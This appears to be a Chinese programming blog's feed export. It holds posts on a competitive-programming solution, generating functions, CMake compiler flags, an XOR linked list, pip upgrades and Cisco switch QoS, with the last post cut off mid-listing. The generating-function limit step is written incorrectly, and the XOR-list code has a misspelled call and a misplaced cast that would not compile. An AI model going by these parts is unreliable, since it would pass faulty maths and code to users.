<span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>            <span class="token punctuation">{</span>                <span class="token keyword">int</span> l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> v<span class="token punctuation">;</span>                cin <span class="token operator">&gt;&gt;</span> l <span class="token operator">&gt;&gt;</span> r <span class="token operator">&gt;&gt;</span> v<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>v<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    l <span class="token operator">=</span> <span class="token function">fa</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">fa</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span> j <span class="token operator">!=</span> l<span class="token punctuation">;</span> j <span class="token operator">=</span> <span class="token function">fa</span><span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        maxv<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxv<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> maxv<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        f<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    r <span class="token operator">=</span> <span class="token function">fa</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>                    maxv<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>maxv<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">,</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>            <span class="token punctuation">{</span>                <span class="token keyword">int</span> x<span class="token punctuation">;</span>                cin <span class="token operator">&gt;&gt;</span> x<span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>f<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">==</span> x <span class="token operator">?</span> maxv<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">fa</span><span class="token punctuation">(</span>maxv<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">fa</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"YES\n"</span> <span class="token operator">:</span> <span class="token string">"N/A\n"</span> <span class="token operator">:</span> <span class="token string">"NO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">default</span><span class="token operator">:</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生成函数</title>
      <link href="/2022/03/13/sheng-cheng-han-shu/"/>
      <url>/2022/03/13/sheng-cheng-han-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="生成函数">生成函数</h1><h2 id="引入">引入</h2><p>对于一个长度无限一个随机数列，我们能不能用一个函数表示这个数列呢？</p><p>我们把每一项当做多项式的一个系数，得到了用来表示序列的多项式函数。</p><blockquote><p>详见：函数插值</p></blockquote><p>思考了一会，又找到了它的一种用途。假如数列 <span class="math inline">\(a\)</span> 代表一类物品，中 <span class="math inline">\(a_i\)</span> 表示这类物品中选 件物品的方案数</p><p>例如：<span class="math inline">\(a=\{1,1,1\}\)</span> 表示 <span class="math inline">\(A\)</span> 类物品中可以选 <span class="math inline">\(0\)</span> 件或 <span class="math inline">\(1\)</span> 件或 <span class="math inline">\(2\)</span> 件，但不能选大于 <span class="math inline">\(2\)</span> 件；又例如无限长数列 <span class="math inline">\(b = \{ 1,0,0,1,0,0,1,0,0, \ldots \}\)</span> 表示<span class="math inline">\(B\)</span> 类物品只能选 <span class="math inline">\(3\)</span> 的倍数件。这时候，把 <span class="math inline">\(f(x) = 1 + x + {x^2}\)</span> 和 <span class="math inline">\(g(x) = 1 + {x^3} + {x^6} + {x^9}...\)</span>乘起来，得到另一个函数 <span class="math inline">\(h(x) = 1 + x + {x^2}+ {x^3} + {x^4} + \ldots\)</span> 。这个函数有什么意义呢？它的第 <span class="math inline">\(i\)</span> 项的系数就是选<span class="math inline">\(A\)</span>、<span class="math inline">\(B\)</span>两种物品共 <span class="math inline">\(i\)</span> 件的方案数。</p><p>大家可能会好奇：这不就是把两个多项式乘起来么？和一次次枚举情况有什么区别？</p><p>这里扯得远一点：多项式可以 <strong>FFT（快速傅里叶变换）</strong></p><p>我们给这个“<strong>用函数表示数列</strong>”的东西取了个名字——数列的“生成函数”，表示用这个函数能生成一个数列。</p><h2 id="一些疑问">一些疑问</h2><p>现在有个问题：</p><p><span class="math inline">\(f(x) = \frac{1}{ {1 - x} }\)</span>是否是 <span class="math inline">\(a = \{ 1,1,1,1,1, \ldots \}\)</span>的生成函数？</p><p>估计大家可能会毅然决然地否定，因为它的生成函数是 <span class="math inline">\(1 + x + {x^2} + {x^3} + \cdots\)</span>。但如果考虑定义域 <span class="math inline">\(x \in ( - 1,1)\)</span>呢？</p><blockquote><p>这里大家可以停顿一下想一想</p></blockquote><p>根据我们小学学过的等比数列求和公式：</p><p><span class="math inline">\(1 + x + {x^2} + {x^3} + \cdots\)</span>的前 <span class="math inline">\(n\)</span> 项和等于<span class="math inline">\(\frac{1 - {x^n} }{1 - x}\)</span> ，</p><p>这是个无限长的数列，</p><p>且 <span class="math inline">\(\mathop {\lim }\limits_{n \to \infty}\frac{1 - {x^n} }{1 - x} = {x^n} = 0\)</span> ，这不就相等了嘛！</p><p>可是好好的一个函数，被我们蹂躏成这个样子，凭空给限定了定义域，这还是原来那个函数嘛？</p><p>注意！生成函数中的 <span class="math inline">\(x\)</span>是没有意义的。</p><p>例如，函数 <span class="math inline">\(1 + {x^2} + {x^4} +{x^6}{\text{ + } } \cdots\)</span> 是不是等于 <span class="math inline">\(\frac{1}{1 - {x^2} }\)</span> ？</p><blockquote><p>提示: t -&gt; x^2</p></blockquote><p>那函数 <span class="math inline">\(1 + 2x + 3{x^2} + 4{x^3}\cdots\)</span> 呢？</p><p>对等式 <span class="math inline">\(\frac{1}{ {1 - x} } = 1 + x +{x^2} + {x^3} + \cdots\)</span> 两边分别求导，或者把两个 <span class="math inline">\(1 + x + {x^2} + {x^3} + \cdots\)</span>乘起来就可以了。</p><p>进而考虑推广，</p><p><span class="math display">\[\frac{1}{ { { {(1 - x)}^k} } } = \sum\limits_i^\infty  {C_{i + k - 1}^{k- 1}{x^i} }\]</span></p><p><span class="math inline">\(\frac{1}{(1 - x)^k}\)</span> 就是 <span class="math inline">\(k\)</span> 个 <span class="math inline">\(1 + x +{x^2} + {x^3} + \cdots\)</span> 相乘，那么第 <span class="math inline">\(i\)</span> 项系数就是从 <span class="math inline">\(k\)</span> 个 <span class="math inline">\(1 + x +{x^2} + {x^3} + \cdots\)</span> 中每个选出一项，乘起来恰为 <span class="math inline">\({x^i}\)</span> 的方案数，就是 <span class="math inline">\(i = {x_1} + {x_2} + ... + {x_k}\)</span>的非负整数解的组数，用组合数学中的隔板法求，是不是有道理 ？</p><h2 id="example-fibbonaci-数列">Example: Fibbonaci 数列</h2><p>先说结论：<strong>生成函数求斐波那契数列的通项</strong></p><p>斐波那契数列的生成函数 ： <span class="math display">\[f(x) = x + {x^2} + 2{x^3} + 3{x^4} + 5{x^5} + 8{x^6} +  \cdots\text{(i)}\]</span> 乘 <span class="math inline">\(x\)</span> ，得 ： <span class="math display">\[x \cdot f(x) = {x^2} + {x^3} + 2{x^4} + 3{x^5} + 5{x^6} + 8{x^7}+  \cdots \text{(ii)}\]</span> 用 <span class="math inline">\(\text{i}\)</span> 式减去 <span class="math inline">\(\text{ii}\)</span> 式，得到 <span class="math display">\[f(x) - x \cdot f(x) = x + {x^3} + {x^4} + 2{x^5} + 3{x^6} + 5{x^7} +\cdots = x + {x^2} \cdot f(x)\]</span> 所以 <span class="math display">\[f(x) = \frac{x}{1 - x - x^2}\]</span></p><p>看着非常难受，把它还原成数列来验证：</p><p>首先， <span class="math inline">\(1 - x - {x^2}\)</span>可以被因式分解为：</p><p><span class="math display">\[(1 - \frac{ {1 - \sqrt 5 } }{2}x)(1 - \frac{ {1 + \sqrt 5 } }{2}x)\]</span> 所以 <span class="math display">\[\frac{x}{ {1 - x - {x^2} } } = \frac{x}{ {(1 - \frac{ {1 - \sqrt 5 }}{2}x)(1 - \frac{ {1 + \sqrt 5 } }{2}x)} }\]</span> 裂项 <span class="math display">\[\frac{x}{ {(1 - \frac{ {1 - \sqrt 5 } }{2}x)(1 - \frac{ {1 + \sqrt 5 }}{2}x)} } =  - \frac{1}{ {\sqrt 5 } }\frac{1}{ {(1 - \frac{ {1 - \sqrt 5} }{2}x)} } + \frac{1}{ {\sqrt 5 } }\frac{1}{ {(1 - \frac{ {1 + \sqrt 5} }{2}x)} }\]</span></p><p>这就是斐波那契数列通项公式了</p><p>这种方法也可以应用到各种<strong>线性齐次递推</strong>中</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 数学 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 离散数学 </tag>
            
            <tag> 生成函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMake构建时对gcc/g++传参</title>
      <link href="/2022/03/13/cmake-gou-jian-shi-dui-gcc-g-chuan-can/"/>
      <url>/2022/03/13/cmake-gou-jian-shi-dui-gcc-g-chuan-can/</url>
      
        <content type="html"><![CDATA[<h1 id="cmake构建时对-gccg-传参">CMake构建时对 gcc/g++ 传参</h1><h2 id="前情提要">前情提要</h2><p>一般情况下，我们可以使用 <code>cmake</code> 命令传递编译器选项</p><p><code>set(CMAKE_CXX_FLAGS "-Wall -std=c++23")</code></p><p>但例如<code>cmake -Wl,-rpath=/home/abcd/newlibs/ path/to/CMakeLists.txt</code>的命令行传参将会覆盖掉 CMakeList.txt 中的设置。</p><h2 id="附加编译器标志">附加编译器标志</h2><p><code>CMAKE_CXX_FLAGS</code>变量的初始内容是 CMake 自身在OS/工具链检测期间被设置的内容，以及继承了环境变量<code>CMAKE_CXX_FLAGS_INIT</code>中的内容。</p><p>所以可以这样调用：</p><p><code>cmake -E env CXXFLAGS="-Wall" cmake ..</code></p><p>在此之后，<code>CMake</code> 会期望用户修改<strong>CMAKE_CXX_FLAGS</strong>变量以附加参数，例如通过使用像<code>ccmake</code> 这样的编辑器。</p><p>可以引入自己的构建类型，例如 <strong>ALL_WARNINGS</strong>.构建参数中附加了构建类型的部分：</p><p><code>cmake -DCMAKE_CXX_FLAGS_ALL_WARNINGS:STRING="-Wall" -DCMAKE_BUILD_TYPE=ALL_WARNINGS ..</code></p><p><code>cmake -DCMAKE_C_FLAGS="-DDEFINED_IN_CLI" ..</code></p><h2 id="附加链接器标志">附加链接器标志</h2><p><strong>链接器选项</strong>和<strong>编译器选项</strong>非常相近。只是<strong>CMake</strong>的变量名称取决于目标类型（EXE或SHARED）MODULE。</p><p><code>CMAKE_EXE_LINKER_FLAGS_INIT</code>,<code>CMAKE_SHARED_LINKER_FLAGS_INIT</code> ,<code>CMAKE_MODULE_LINKER_FLAGS_INIT</code>合并后构成了<code>LDFLAGS</code>并继承给了<code>CMAKE_EXE_LINKER_FLAGS</code>,<code>CMAKE_SHARED_LINKER_FLAGS</code> ,<code>CMAKE_MODULE_LINKER_FLAGS</code>.</p><p>因此，我们可以这样使用：</p><p><code>cmake -E env LDFLAGS="-rpath=/home/abcd/libs/" cmake ..</code></p><p>命令附加了构建类型的部分：</p><p><code>cmake -DCMAKE_SHARED_LINKER_FLAGS_MY_RPATH:STRING="-rpath=/home/abcd/libs/" -DCMAKE_BUILD_TYPE=MY_RPATH ..</code></p><h2 id="备选方案">备选方案</h2><p>CMake确实提供了特殊变量来以独立于平台的方式设置编译器/链接器标志。所以不需要知道具体的编译器/链接器选项。</p><p>例如：</p><p><code>CMAKE_CXX_STANDARD</code><code>CMAKE_POSITION_INDEPENDENT_CODE</code><code>CMAKE_BUILD_RPATH</code><code>CMAKE_INSTALL_RPATH_USE_LINK_PATH</code></p><p>不幸的是，编译器的警告等级还尚未支持</p><h2 id="举例">举例</h2><p><code>cmake -DCMAKE_CXX_FLAGS="$(CMAKE_CXX_FLAGS) -DYOUR_CUSTOM_DEFINE=1" &lt;其余命令&gt;</code></p><blockquote><p><a href="https://stackoverflow.com/questions/44284275/passing-compiler-options-cmake">https://stackoverflow.com/questions/44284275/passing-compiler-options-cmake</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> CMake </tag>
            
            <tag> 开发 </tag>
            
            <tag> CLion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单指针实现双向链表</title>
      <link href="/2022/03/06/dan-zhi-zhen-shi-xian-shuang-xiang-lian-biao/"/>
      <url>/2022/03/06/dan-zhi-zhen-shi-xian-shuang-xiang-lian-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="单指针实现双向链表">单指针实现双向链表</h1><h2 id="介绍">介绍</h2><p>普通<a href="https://zh.wikipedia.org/wiki/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8" title="双向链表">双向链表</a>的每个结点有三个域，分别存储着前一个结点的地址、后一个点的地址，以及数据</p><pre class="line-numbers language-none"><code class="language-none">...  A       B         C         D         E  ...         –&gt;  next –&gt;  next  –&gt;  next  –&gt;         &lt;–  prev &lt;–  prev  &lt;–  prev  &lt;–    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>异或链表通过异或操作（这里用⊕表示）把前一个结点的地址和后一个结点的地址变成一个地址</p><pre class="line-numbers language-none"><code class="language-none">...  A         B               C                D            E  ...         &lt;–&gt;  A⊕C     &lt;-&gt;    B⊕D     &lt;-&gt;      C⊕E  &lt;-&gt;      link(B) = addr(A)⊕addr(C), link(C) = addr(B)⊕addr(D), …    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当从左往右遍历的时候，如果当前结点是C，指针域是内容是B⊕D,通过和前一个结点B的地址做异或操作就能得到下一个结点D的地址，如此重复便能遍历整个链表。</p><h2 id="code">Code</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">LNode</span><span class="token punctuation">{</span><span class="token keyword">int</span> data<span class="token punctuation">;</span>LNode<span class="token operator">*</span> pnx<span class="token punctuation">;</span> <span class="token comment">// XOR of the address of prev and next node</span><span class="token function">LNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> dat<span class="token punctuation">,</span> LNode<span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">data</span><span class="token punctuation">(</span>dat<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">pnx</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span> LNode<span class="token operator">*</span> <span class="token function">XOR</span><span class="token punctuation">(</span>LNode<span class="token operator">*</span> add1<span class="token punctuation">,</span> LNode<span class="token operator">*</span> add2<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// on 64-bit machine, pointer is 64-bit. Conversion of a pointer type to</span><span class="token comment">//   int type, which is 32-bit, is not allowed.</span><span class="token keyword">return</span> <span class="token punctuation">(</span>LNode<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">unsigned</span><span class="token punctuation">)</span>add1 <span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">unsigned</span><span class="token punctuation">)</span>add2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>LNode<span class="token operator">*</span><span class="token operator">*</span> headref<span class="token punctuation">,</span> <span class="token keyword">int</span> data<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// Allocate memory for new node</span>LNode<span class="token operator">*</span> newHead <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">LNode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Since new node is being inserted at the begining, npx of new node   will always be XOR of current head and NULL */</span>newHead<span class="token operator">-&gt;</span>pnx <span class="token operator">=</span> <span class="token function">XOR</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">*</span>headref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* If linked list is not empty, then npx of current head node will be XOR   of new node and node next to current head */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>headref<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token operator">*</span>headref<span class="token punctuation">)</span><span class="token operator">-&gt;</span>pnx <span class="token operator">=</span> <span class="token function">OXR</span><span class="token punctuation">(</span>newHead<span class="token punctuation">,</span> <span class="token function">XOR</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">*</span>headref<span class="token punctuation">)</span><span class="token operator">-&gt;</span>pnx<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token operator">*</span>headref<span class="token punctuation">)</span> <span class="token operator">=</span> newHead<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 算法 </tag>
            
            <tag> 链表 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip包全部更新</title>
      <link href="/2022/02/27/pip-bao-quan-bu-geng-xin/"/>
      <url>/2022/02/27/pip-bao-quan-bu-geng-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="pip包全部更新">pip包全部更新</h1><h2 id="升级pip3">升级pip3</h2><p><code>sudo python3 -m pip install --upgrade pip</code></p><h2 id="查看过期的python-package">查看过期的python package</h2><p><code>pip3 list --outdated</code></p><h2 id="升级单个package">升级单个package</h2><p><code>pip3 install --upgrade --no-cache-dir &lt;package&gt;</code></p><h2 id="批量升级package">批量升级package</h2><p>安装<code>pip-review</code>，不区分<code>pip</code>与<code>pip3</code>。</p><pre class="line-numbers language-none"><code class="language-none">pip3 install pip-reviewpip-review --local --interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco QoS 配置</title>
      <link href="/2022/02/24/cisco-qos-pei-zhi/"/>
      <url>/2022/02/24/cisco-qos-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>Cisco Catalyst 3750 交换机支持各种 QoS功能，例如分类、标记、策略、排队和调度。本文档通过配置示例介绍这些 QoS功能。</p><h2 id="先决条件">先决条件</h2><h3 id="要求">要求</h3><p>Cisco 建议您应具备<a href="https://www.cisco.com/en/US/docs/switches/lan/catalyst3750/software/release/12.2_35_se/configuration/guide/swqos.html" title="US 网站">配置 QoS</a> 的相关知识。</p><h3 id="使用的组件">使用的组件</h3><p>本文档中的信息基于以下软件和硬件版本：</p><ul><li><p>Cisco Catalyst 3750 交换机 - WS-C3750-24TS</p></li><li><p>Cisco IOS® 软件版本 12.2(35)SE2</p></li></ul><p>本文档中的信息都是基于特定实验室环境中的设备编写的。本文档中使用的所有设备最初均采用原始（默认）配置。如果您使用的是真实网络，请确保您已经了解所有命令的潜在影响。</p><h3 id="规则">规则</h3><p>有关文档规则的详细信息，请参阅 <a href="https://www.cisco.com/en/US/tech/tk801/tk36/technologies_tech_note09186a0080121ac5.shtml">Cisco技术提示规则。</a></p><h2 id="qos-概述">QoS 概述</h2><p>使用QoS，您可以优先处理特定类型的数据流，而牺牲对其他数据流的处理。可以使用QoS 标签来区分数据流。第 3 层 IP 报头中最常用的两个 QoS 标签是 IP优先级字段和 DSCP 字段。第2层帧头中的QoS标签称为服务类别(CoS)。 Catalyst交换机 QoS 工具可基于第 3 层 QoS 标签或第 2 层 QoS标签提供优先处理。本文档提供的各种示例可帮助您了解在 Cisco Catalyst交换机中第 2 层和第 3 层 QoS 标签的用法。</p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config1.gif" title="US 网站"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config1.gif" alt="cat3750-qos-config1.gif"></a></p><h3 id="未启用-qos-的-cisco-catalyst-3750-交换机">未启用 QoS 的 CiscoCatalyst 3750 交换机</h3><p>默认情况下，QoS 在 Catalyst 3750 交换机上处于禁用状态。当 QoS处于禁用状态时，所有帧/数据包均直接通过交换机，不做任何更改。例如，如果进入交换机的帧的CoS 为 5，帧中的数据包的 DSCP 为 EF，则 CoS 和 DSCP标签不会更改。数据流在离开时具有与进入时相同的 CoS 和 DSCP值。所有数据流（包括语音）均“尽最大努力按原样”提供。</p><pre class="line-numbers language-none"><code class="language-none">Switch#show mls qosQoS is disabledQoS ip packet dscp rewrite is enabled!--- Even though it says QoS ip packet dscp rewrite is enabled,!--- the switch does not alter the DSCP label on the packets when!--- the QoS is disabled.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="cisco-catalyst-3750-交换机-qos-功能">Cisco Catalyst 3750 交换机QoS 功能</h3><p>在 3750 交换机上启用 QoS 后，默认情况下会启用一些入口和出口 QoS功能。下图显示了交换机的 QoS 体系结构的高级视图：</p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config2.gif" title="US 网站"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config2.gif" alt="cat3750-qos-config2.gif"></a></p><p>以下是基于该图的要点汇总：</p><ul><li><p>入口 QoS功能（例如分类、标记和策略）可以按端口逐个进行配置。</p></li><li><p>输入映射表和入口队列可以进行全局配置。这些不能按端口逐个进行配置。</p></li><li><p>入口队列的 SRR 可以进行全局配置。</p></li><li><p>堆栈环带宽取决于堆栈布线。如果以全部带宽连接堆栈，则可获得 32Gbps带宽。此带宽由堆栈中的所有交换机共享。</p></li><li><p>输出映射表和出口队列可以进行全局配置。可以设置二个队列集配置，并可以为端口应用任何一个队列集配置。</p></li><li><p>出口队列的 SRR 可以按端口逐个进行配置。</p></li></ul><h2 id="入口-qos-功能">入口 QoS 功能</h2><p>本部分介绍各种可能的入口 QoS 配置的概念。此部分包括以下主题：</p><ul><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#concept21">默认入口QoS 配置</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#concept22">分类和标记</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#cg23">管制</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#cg24">拥塞管理和避免</a></p></li></ul><h3 id="默认入口-qos-配置">默认入口 QoS 配置</h3><p>以下是交换机在启用 QoS 后默认的帧处理方式：</p><ul><li><p>一个帧进入交换机端口，且未对该帧进行标记（这表示该端口为接入端口，并且该帧在进入交换机时未进行ISL 或 dot1q 封装）。</p></li><li><p>交换机使用 dot1q 封装该帧（忽略 ISL，因为 dot1q是所有新交换机上的默认选项）。</p></li><li><p>在 dot1q 帧标记中，存在名为 802.1p 优先级位的三个可用位，也称为CoS。这些位均设置为 0。</p></li><li><p>随后，交换机基于 CoS-DSCP 映射表计算 DSCP值。根据表，交换机将DSCP值设置为0。DSCP值位于数据包的IP报头。</p></li></ul><p>总之，如果 QoS 在交换机上处于启用状态，默认情况下，进入交换机的帧的CoS 和 DSCP 值将设置为 0。</p><h3 id="分类和标记">分类和标记</h3><p>与路由器不同，在 Cisco Catalyst 交换机中，QoS分类和标记操作不尽相同。在思科路由器中，您可以根据传入数据包DSCP值或访问控制列表(ACL)使用MQC对数据包进行分类。这取决于您是否信任传入的数据包的 QoS 标签。在 Cisco Catalyst 3750交换机中，可以基于传入的 CoS/DSCP 值进行分类，也可以基于 ACL对帧进行分类。</p><p>基于传入的 CoS/DSCP 值的配置可以通过三种不同方式实现：</p><ul><li><p>使用基于接口的 <strong>mls qos命令基于端口进行配置</strong></p></li><li><p>使用 class-map 和 policy-map 基于 MQC 进行配置</p></li><li><p>基于 VLAN 进行配置</p></li></ul><p>您可以使用这三种方法中的任意一种。不能在一个端口中使用多种方法。例如，已在端口上配置了<strong>mls qos trust cos 命令。</strong>在使用 <strong>service-policyinput &lt;policy-map-name&gt; 命令配置该端口时，会自动删除 mls qos trustcos 命令。</strong></p><p>分类和标记 - 基于端口部分将介绍基于端口的配置。</p><p>分类和标记 - 基于 MQC 部分将介绍基于 MQC 的分类。</p><h4 id="分类和标记---基于端口">分类和标记 - 基于端口</h4><p>本部分将介绍基于特定于接口的配置的分类。在标题为“分类和标记”的部分可能会遇到问题。这是因为在Cisco Catalyst 3750 交换机中，将使用映射表对帧（帧中的数据包）的 CoS 或DSCP 值进行重新标记。但映射表在 Cisco 路由器中不可用。它们仅在 CiscoCatalyst 交换机中可用。在本部分中，您将了解到这些表的功能。</p><p>本部分将讨论以下两种配置：</p><ul><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#cg211">分类- 端口信任配置</a></p></li><li><p><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html#cg212">标记- QoS 映射表配置</a></p></li></ul><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config3.gif" title="cat3750-qos-config3.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config3.gif" alt="cat3750-qos-config3.gif"></a></p><h4 id="分类---端口信任配置">分类 - 端口信任配置</h4><p>传入的数据包或帧可能已经分配了 QoS 标签。可能会遇到以下问题：</p><ul><li><p>是否信任端口上传入的数据包/帧的 QoS 标签？</p></li><li><p>如果 IP 电话和 PC 连接到端口，是否信任该电话、PC 或二者的 QoS标签？</p></li></ul><p>如果不信任传入的数据包/帧的 QoS标签，则需要基于访问列表对数据包进行分类并标记 QoS标签。如果信任传入的数据包/帧的 QoS标签，则另一个问题是，是否需要信任端口上传入的数据包/帧的 CoS 值或 DSCP值？这取决于所采用的方案。在本部分中，您可以看到各种不同的方案及其示例。</p><p>端口信任配置选项为：</p><pre class="line-numbers language-none"><code class="language-none">Switch(config-if)#mls qos trust ?  cos            cos keyword  device         trusted device class  dscp           